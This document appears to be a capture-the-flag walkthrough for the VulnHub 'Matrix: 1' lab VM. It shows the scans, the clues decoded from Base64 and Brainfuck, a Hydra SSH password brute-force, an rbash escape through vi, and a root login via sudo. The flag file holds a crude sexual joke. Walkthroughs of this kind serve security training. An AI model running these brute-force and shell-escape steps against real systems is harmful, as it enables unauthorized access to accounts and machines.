# Matrix: 1 - CTF Walkthrough
[VulnHub URL]
## Description:
```
Matrix is a medium level boot2root challenge. The OVA has been tested on both VMware and Virtual Box.
Difficulty: Intermediate
Flags: Your Goal is to get root and read /root/flag.txt
Networking: DHCP: Enabled IP Address: Automatically assigned
Hint: Follow your intuitions ... and enumerate!
For any questions, feel free to contact me on Twitter: @unknowndevice64
```
## Contents:
 1. Initial scanning & recon
 2. Following the white rabbit to BASE64 and Brainfuck.
 3. Generating a wordlist for the 'guest' account.
 4. Escaping rbash with a text editor.
 5. Capturing `flag.txt`.
## Initial scanning & recon
 - Nmap
 - Nikto

Nmap:
```
Nmap scan report for matrix.local (192.168.56.101)
Host is up (0.00029s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:8b:c7:7b:48:db:db:0c:4b:68:69:80:7b:12:4e:49 (RSA)
|   256 49:6c:23:38:fb:79:cb:e0:b3:fe:b2:f4:32:a2:70:8e (ECDSA)
|_  256 53:27:6f:04:ed:d1:e7:81:fb:00:98:54:e6:00:84:4a (ED25519)
80/tcp    open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.14
|_http-title: Welcome in Matrix
31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.14
MAC Address: 08:00:27:E5:B2:AA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
```
Nikto:
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.101
+ Target Hostname:    matrix.local
+ Target Port:        80
+ Start Time:         2019-01-24 15:46:27 (GMT0)
---------------------------------------------------------------------------
+ Server: SimpleHTTP/0.6 Python/2.7.14
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ SimpleHTTP/0.6 appears to be outdated (current is at least 1.2)
+ ERROR: Error limit (20) reached for host, giving up. Last error: invalid HTTP response
+ Scan terminated:  20 error(s) and 4 item(s) reported on remote host
+ End Time:           2019-01-24 15:46:38 (GMT0) (11 seconds)
```

## Following the white rabbit to BASE64 and Brainfuck.

Looking at the two HTTP services (80 and 31337), the structure appears to remain pretty much the same.

Port 80's page source however, points to a picture of a white rabbit with the name referring to the other port. Might as well follow it.

Looking into the other HTTP service's page source reveals a BASE64 encoded string, to decrpyt it in one line (on *NIX systems) type the 
following: `echo {BASE64 STRING} | base64 -d `

After doing this, you will see the following message:
```
echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix
```

Of course `Cypher.matrix` is a filename. Navigating to `matrix.local:31337/Cypher.matrix` will prompt you to download a file.

The contents, which I won't post here are encoded in [Brainfuck], a great translator for this language can be found [here].

The decoded message reads:
```
You can enter into matrix as guest, with password k1ll0rXX

Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.
```
## Generating a wordlist for the 'guest' account
There are a variety of ways this can be done, for those who have little experience with programming, you can use a tool called [maskprocessor] 
(installed in Kali).

The command used to generate the wordlist is as follows: `mp64 k1ll0r?a?a`

The next step is to use a password attack utility, like [Hydra], to test the potential passwords on the SSH service (port 22).

The command I used is as follows:
```
hydra -l guest -P passwords.txt -o out.txt -s 22 -t 4 matrix.local ssh
```
Here is a quick rundown of this command:

	- *-l* - A single username, capitalise this if you want to use a list of users.
	- *-P* - The list of passwords from `mp64`.
	- *-o* - The output file.
	- *-s* - The target port. This only needs to be defined if the service you're attacking is running on a different port from the 
	normal one.
	- *-t* - Number of concurrent attacks to make, 4 is recommended for SSH, as any more could cause trouble with the service.
	- *matrix.local* - Obviously the hostname or IP address you're targeting.
	- *ssh* - Specifies the type of service Hydra will attack.

Roughly ten minutes later, I got a hit:
```
[22][ssh] host: matrix.local   login: guest   password: k1ll0r7n
```

## Escaping rbash with a text editor
So upon logging into the SSH service, it quickly becomes apparent that the `guest` account has a few restrictions...

Commands like `ls` and `id` don't work, even `cd` is restricted.

This is the work of something known as [rbash], a locked-down shell that stops attackers from running potentially dangerous commands.

Obviously, this can be broken - surprisingly easily.

The first step was to get an understanding of what is available to the guest, running `export -p` will output a lot of useful information
about what you can access. Without running through all of the dull information, this line is important:
```
declare -rx PATH="/home/guest/prog"
```
This directory holds all programs that can be accessed from simply typing their names, using echo to see everything in there:
`echo prog/*` shows that `vi` is present.

`rbash` is pretty terrible just on its own, [there are many ways] of escaping without a lot of effort. One way uses a text editor, `vi`
for example:
```
$ vi
:set shell=/bin/bash
:!/bin/bash
bash-4.4$ export PATH=/usr/bin:/bin/
```
So we've got an unrestricted (normal) Bash shell, without messing around with anything else on the system, let's get root.

## Capturing flag.txt
```
$sudo -i

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password: 
root@porteus:~# whoami
root
```
Yeah... You can use `k1ll0r7n` to execute commands as `root`. Navigating to `/root/flag.txt`..:
```
root@porteus:~# more flag.txt 
   _,-.                                                             
,-'  _|                  EVER REWIND OVER AND OVER AGAIN THROUGH THE
|_,-O__`-._              INITIAL AGENT SMITH/NEO INTERROGATION SCENE
|`-._\`.__ `_.           IN THE MATRIX AND BEAT OFF                 
|`-._`-.\,-'_|  _,-'.                                               
     `-.|.-' | |`.-'|_     WHAT                                     
        |      |_|,-'_`.                                            
              |-._,-'  |     NO, ME NEITHER                         
         jrei | |    _,'                                            
              '-|_,-'          IT'S JUST A HYPOTHETICAL QUESTION    
```
On that note, that's this CTF done.


[VulnHub URL]: <https://www.vulnhub.com/entry/matrix-1,259/>
[Brainfuck]: <https://en.wikipedia.org/wiki/Brainfuck>
[here]: <https://www.dcode.fr/brainfuck-language>
[maskprocessor]: <https://github.com/kieran-walker-0/maskprocessor>
[Hydra]: <https://github.com/kieran-walker-0/thc-hydra>
[rbash]: <https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html>
[there are many ways]: <https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells>


